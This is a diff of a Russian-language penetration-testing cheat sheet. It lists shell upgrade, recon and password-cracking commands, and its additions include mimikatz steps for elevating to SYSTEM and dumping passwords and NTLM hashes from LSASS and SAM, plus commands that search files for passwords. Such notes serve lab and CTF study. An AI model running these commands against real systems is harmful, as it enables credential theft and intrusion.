@@ -63,7 +63,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ssh -i id_rsa -p 2222 dave@192.168.178.201
 	id_rsa - private key, используется с парольной фразой, которую также запросят ввести, файл должен иметь права 600 (!!!)
 Первым делом на удаленной машине:
-id
+id		                             
 pwd
 history
 sudo -l	какие команды доступны из-под sudo для данного пользователя
@@ -75,7 +75,7 @@ gtfobin
 sc start/query/stop <service name>
 	для перезапуска атакуемого сервиса на Windows, имя сервиса - из вывода winPEAS.exe
 
-=================RECON
+=================RECON LINUX
 linPEAS
 	privelege escalation script from github
 	его можно использовать для поиска полезной информации, когда уже есть подключение к целевой системе
@@ -101,9 +101,21 @@ findstr /si "password=" *.txt *.ini *.config
 dir *.kdbx /s	поиск файлов в подпапках из текущей
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 		тоже самое в powershell
+Get-LocalUser
+	список пользователей
 sc		service control
 sc query windefend
 netsh firewall show state
+
+whoami /priv
+	проверка текущих привелегий
+mimikatz.exe
+	программа для извлечения хешей и паролей в винде
+	privilege::name		проверка текущих привелегий
+	privilege::debug	команда первоначально выполняется для сохранения уровня прав последующим командам
+	token::elevate		поднять права в системе до SYSTEM
+	sekurlsa::logonpasswords хеши и пароли пользователей, источник: LSASS.exe (данные, загруженные в памяти процесса активных пользователей)
+	lsadump::sam		только NTLM хеши пользователя, истояник: файл SAM на диске
 
 ================FUZZING
 gobuster - на Go, только консоль (более современная версия dirb и dirbuster)
@@ -196,7 +208,8 @@ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt file.zip
 	имена/логины
 /usr/share/wordlists/rockyou.txt
 	пароли
-
+/usr/share/hashcat/rules/best66.rule
+	правила для мутаций пароля при переборе
 
 
 
